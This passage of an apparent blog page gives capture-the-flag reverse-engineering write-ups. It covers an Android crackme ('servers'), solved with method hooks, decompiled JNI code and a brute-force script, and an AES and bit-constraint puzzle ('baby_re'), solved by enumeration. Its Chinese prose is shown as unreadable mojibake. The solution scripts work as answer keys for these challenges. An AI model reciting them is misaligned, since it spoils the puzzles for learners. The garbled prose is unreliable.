additive_decrypt(additive_decrypt(result))</span><br><span class="line">res = multiplicative_decrypt(res)</span><br><span class="line">res = additive_decrypt(additive_decrypt(res))</span><br><span class="line">res = additive_decrypt(res)</span><br><span class="line">res = multi_layer_rc4_decrypt(res)</span><br><span class="line"><span class="comment"># print(res)</span></span><br></pre></td></tr></table></figure><h2 id="servers">servers</h2><p>æ‰“å¼€åº”ç”¨ï¼Œå‘ç°æœ‰ä¸¤ä¸ªæŒ‰é’®inputå’Œcheckï¼Œå¯¹åº”äº†ä¸¤ä¸ªonClickå‡½æ•°</p><p><img src="https://s2.loli.net/2024/11/01/rag4cT3hXQJMlso.png" alt="image-20241101004406675"></p><p>å¾ˆæ˜æ˜¾ç”¨äº†åŠ¨æ€åŠ è½½ç±»ã€‚å°è¯•å…ˆå¯¹decodeå‡½æ•°è¿›è¡Œhook</p><p>å¾—åˆ°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">myclass.decode is called: <span class="attribute">str</span>=RtHTxaKcRXIdES5ktXugN2ww1d91EMp/QOxAh8bV</span><br><span class="line">myclass.decode <span class="attribute">result</span>=android.content.ContextWrapper</span><br><span class="line">myclass.decode is called: <span class="attribute">str</span>=VMvWxbmmRC4IFyN1</span><br><span class="line">myclass.decode <span class="attribute">result</span>=startService</span><br><span class="line">myclass.decode is called: <span class="attribute">str</span>=RtHTxaKcRXIdES5ktXugN2ww1d91EMp/QOxAh8bV</span><br><span class="line">myclass.decode <span class="attribute">result</span>=android.content.ContextWrapper</span><br><span class="line">myclass.decode is called: <span class="attribute">str</span>=VMvYx56QUyoXHSU=</span><br><span class="line">myclass.decode <span class="attribute">result</span>=stopService</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), <span class="keyword">new</span> <span class="title class_">OnApplyWindowInsetsListener</span>() &#123; <span class="comment">// from class: com.nobody.Serv1ce.MainActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// androidx.core.view.OnApplyWindowInsetsListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> WindowInsetsCompat <span class="title function_">onApplyWindowInsets</span><span class="params">(View view, WindowInsetsCompat windowInsetsCompat)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> MainActivity.lambda$onCreate$<span class="number">0</span>(view, windowInsetsCompat);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.ClickMe);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">button2</span> <span class="operator">=</span> (Button) findViewById(R.id.ClickMe1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) MyService.class);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.nobody.Serv1ce.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            <span class="type">myclass</span> <span class="variable">myclassVar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">myclass</span>();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; mycall = myclassVar.mycall(myclassVar.decode(<span class="string">&quot;RtHTxaKcRXIdES5ktXugN2ww1d91EMp/QOxAh8bV&quot;</span>));</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> mycall.getMethod(myclassVar.decode(<span class="string">&quot;VMvWxbmmRC4IFyN1&quot;</span>), Intent.class);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">newInstance</span> <span class="operator">=</span> mycall.getConstructor(Context.class).newInstance(<span class="built_in">this</span>);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;input&quot;</span>, ((TextView) MainActivity.<span class="built_in">this</span>.findViewById(R.id.Input)).getText().toString());</span><br><span class="line">                method.invoke(newInstance, intent);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) MyService.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> mycall.getMethod(myclassVar.decode(<span class="string">&quot;VMvWxbmmRC4IFyN1&quot;</span>), Intent.class);</span><br><span class="line">method.invoke(newInstance, intent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯´æ˜å®ƒç”¨è‡ªå·±çš„serviceè°ƒç”¨äº†startService</p><p>æŸ¥çœ‹è¿™ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String str, <span class="type">byte</span>[] bArr, <span class="type">int</span> i)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>nativeå‡½æ•°</p><p>ç»§ç»­hookæ£€æŸ¥å‡½æ•°</p><p>å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bArr</span>=-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>, i=<span class="number">11</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°æœ€åæ£€æŸ¥å€¼</p><p>ç„¶åçœ‹soæ–‡ä»¶ï¼Œç›´æ¥å°±æœ‰åŠ å¯†é€»è¾‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_nobody_Serv1ce_MyService_check</span><span class="params">(JNIEnv *a1, jclass *a2, <span class="type">void</span> *a3, <span class="type">void</span> *a4, <span class="type">char</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// x20</span></span><br><span class="line">  jbyte *v9; <span class="comment">// x21</span></span><br><span class="line">  __int64 v10; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// w10</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">4</span>]; <span class="comment">// [xsp+4h] [xbp-Ch] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+8h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  v8 = (*a1)-&gt;GetStringUTFChars(a1, a3, v13);</span><br><span class="line">  v9 = (*a1)-&gt;GetByteArrayElements(a1, a4, v13);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v8) == <span class="number">36LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (v8[v10] ^ v9[v10]) * a5;</span><br><span class="line">      v8[v10] = v11;</span><br><span class="line">      <span class="keyword">if</span> ( v[v10] != v11 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v10 == <span class="number">36</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éå¸¸æ˜æ˜¾ï¼Œç›´æ¥çˆ†ç ´å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0xB9</span>, <span class="number">0x32</span>, <span class="number">0xC2</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0xD5</span>, <span class="number">0xCA</span>, <span class="number">0xFB</span>, <span class="number">0xF8</span>, <span class="number">0xFB</span>, <span class="number">0x80</span>, <span class="number">0x7C</span>, <span class="number">0xD4</span>, <span class="number">0xE5</span>, <span class="number">0x93</span>, <span class="number">0xD5</span>, <span class="number">0x1C</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xDF</span>, <span class="number">0xDA</span>, <span class="number">0xA1</span>, <span class="number">0x11</span>, <span class="number">0xF8</span>, <span class="number">0xA1</span>, <span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0xC2</span>, <span class="number">0x7C</span>, <span class="number">0x8B</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0xA3</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="comment"># print(len(last))</span></span><br><span class="line">key = [-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>]</span><br><span class="line">num = <span class="number">11</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> ((key[i]^ch)*num)&amp;<span class="number">0xff</span> == last[i]:</span><br><span class="line">            flag.append(ch)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">pl(flag)</span><br></pre></td></tr></table></figure><h2 id="baby-re">baby_re</h2><p>æ‰“å¼€ä¸€çœ‹ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æœ‰å¾ˆæ˜æ˜¾çš„AESç‰¹å¾ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå·±çš„å€¼æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ç¡®å®æ˜¯AES</p><p><img src="https://s2.loli.net/2024/11/01/1DbyM6Av5iL8sgJ.png" alt="image-20241101145041414"></p><p>ç¬¬äºŒæ®µæ˜¯ä¸€ä¸ªå°†åŠ å¯†åæ¯ä¸ªè¾“å…¥åˆ‡ä¸ºbitï¼Œç„¶åé™„ä¸Š4ä½indexå€¼</p><p><img src="https://s2.loli.net/2024/11/01/EZNFhcsgR5AvHzY.png" alt="image-20241101144424639"></p><p>æœ€åä¸€æ®µçš„æ£€æŸ¥å‡½æ•°æ˜¯bitçš„ä¸€å †è¿ç®—ï¼Œæœ¬æ¥æƒ³ç”¨z3ï¼Œä½†æ˜¯z3ç±»å‹ä¸€ç›´æŠ¥é”™ï¼Œç„¶åä¸€æƒ³å‘ç°åªæœ‰8+4ä½ï¼Œç›´æ¥å¼€çˆ†</p><p><img src="https://s2.loli.net/2024/11/01/Gc5CqzRadITxtSo.png" alt="image-20241101145100006"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_combinations</span>(<span class="params">n</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">current:<span class="built_in">list</span>, length</span>):</span><br><span class="line">        <span class="keyword">if</span> length == n:</span><br><span class="line">            result.append(current[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        backtrack(current+[<span class="number">0</span>], length + <span class="number">1</span>)</span><br><span class="line">        backtrack(current+[<span class="number">1</span>], length + <span class="number">1</span>)</span><br><span class="line">    backtrack([], <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">datab = generate_combinations(<span class="number">8</span>)</span><br><span class="line">dataf = generate_combinations(<span class="number">4</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="comment"># print(datab)</span></span><br><span class="line"><span class="comment"># print(dataf)</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dataf)):</span><br><span class="line">    turn_choice = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(datab)):</span><br><span class="line">        data = datab[i] + dataf[j]</span><br><span class="line">        v1 = data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">7</span>] &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; data[<span class="number">3</span>] &amp; ((data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">9</span>] &amp; data[<span class="number">7</span>] &amp; data[<span class="number">5</span>] &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">10</span>] &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] &amp; data[<span class="number">1</span>] &amp; data[<span class="number">0</span>]) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>)</span><br><span class="line">        v2 = data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">7</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; (data[<span class="number">1</span>] &amp; data[<span class="number">0</span>]) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) | (data[<span class="number">10</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; data[<span class="number">8</span>] &amp; data[<span class="number">7</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; data[<span class="number">3</span>] &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; data[<span class="number">3</span>] &amp; data[<span class="number">2</span>] &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">5</span>] &amp; data[<span class="number">3</span>] &amp; data[<span class="number">2</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | (v1 | data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; data[<span class="number">6</span>] &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; data[<span class="number">3</span>] &amp; data[<span class="number">2</span>] &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>)) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>)</span><br><span class="line">        v3 = data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; data[<span class="number">6</span>] &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; (data[<span class="number">1</span>] &amp; data[<span class="number">0</span>]) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) | (data[<span class="number">10</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; data[<span class="number">6</span>] &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; data[<span class="number">3</span>] &amp; ((data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">9</span>] &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; data[<span class="number">5</span>] &amp; ((data[<span class="number">4</span>] | data[<span class="number">3</span>] | data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; data[<span class="number">7</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | v2</span><br><span class="line">        <span class="keyword">if</span> ((data[<span class="number">10</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) | v3 | data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; ((data[<span class="number">3</span>] | data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>)) ):</span><br><span class="line">            turn_choice.append(data)</span><br><span class="line">    res.append(turn_choice)</span><br><span class="line">    <span class="comment"># print((turn_choice))</span></span><br><span class="line"></span><br><span class="line">fi = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> res:</span><br><span class="line">    qu = []</span><br><span class="line">    <span class="keyword">for</span> ie <span class="keyword">in</span> b:</span><br><span class="line">        t = ie[:<span class="number">8</span>]</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i)<span class="keyword">for</span> i <span class="keyword">in</span> t),<span class="number">2</span>)</span><br><span class="line">        qu.append(t)</span><br><span class="line">    fi.append(qu)</span><br><span class="line"><span class="comment"># for f in fi:</span></span><br><span class="line"><span class="comment">#     phex(f)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_com</span>(<span class="params">lists</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lists:</span><br><span class="line">        <span class="keyword">return</span> [[]]</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> lists[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> rest <span 